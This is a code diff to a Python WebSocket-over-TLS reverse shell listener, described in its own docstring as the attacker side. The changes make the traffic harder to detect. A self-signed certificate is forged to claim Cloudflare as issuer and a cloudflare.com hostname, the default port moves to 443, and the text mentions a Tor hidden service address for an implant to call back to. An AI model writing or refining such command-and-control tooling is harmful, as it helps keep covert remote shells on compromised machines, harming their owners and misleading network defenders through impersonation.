@@ -3,8 +3,9 @@
 WSS reverse shell listener (attacker side).
 
 Setup (direct mode):
-  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
-    -days 365 -nodes -subj '/CN=localhost'
+  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
+    -keyout key.pem -out cert.pem -days 730 -nodes \
+    -subj '/C=US/ST=California/O=Cloudflare Inc/CN=cdn-wss.cloudflare.com'
   pip install websockets
   python3 listener.py [port]
 
@@ -42,7 +43,7 @@ except ImportError:
     print("[!] pip install websockets")
     sys.exit(1)
 
-PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4443
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 443
 
 async def handler(ws):
     print(f"[*] Shell connected from {ws.remote_address}")
@@ -86,7 +87,7 @@ async def main():
         print(f"[*] Tor hidden service: {onion}")
         print(f"    Set implant's ENC_DEFAULT_IP to this .onion address")
 
-    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx):
+    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx, process_request=lambda p, h: None):
         await asyncio.Future()
 
 if __name__ == "__main__":
